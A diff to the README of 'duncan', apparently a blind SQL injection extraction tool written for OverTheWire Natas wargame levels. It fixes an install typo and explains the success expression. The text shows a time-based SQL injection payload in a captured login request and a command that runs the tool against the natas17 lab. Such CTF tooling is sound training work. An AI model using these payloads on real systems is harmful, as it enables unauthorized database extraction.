@@ -6,7 +6,7 @@ I did a quite a few challenges and based around this and got bored writing simil
 
 ## Installation
 1. Git clone the repo
-2. `pip install doctopt`
+2. `pip install docopt`
 
 ## Usage
 1. Capture a request using your method of choice (or just fabricate one in a text file). See below (Note: You need to put $$PAYLOAD$$ where you want the current extracted value inserting)
@@ -26,7 +26,7 @@ Content-Type: application/x-www-form-urlencoded
 
 username=natas18%22+and+password+like+binary+%27$$PAYLOAD$$%25%27+and+sleep%281%29+%23
 ```
-2. Run duncan providing the url to use, the request file, a character set to use and an expression to determine the sucess or failure of the extraction. Optional you can give a data length to extract
+2. Run duncan providing the url to use, the request file, a character set to use and an expression (you have access to the http response object as the r value and it is a requests.Response object) to determine the sucess or failure of the extraction. Optional you can give a data length to extract
 
 ```
 $ ./duncan.py -r natas17.txt -u http://natas17.natas.labs.overthewire.org -c alpha -l 32 -e "r.elapsed.seconds >= 1"
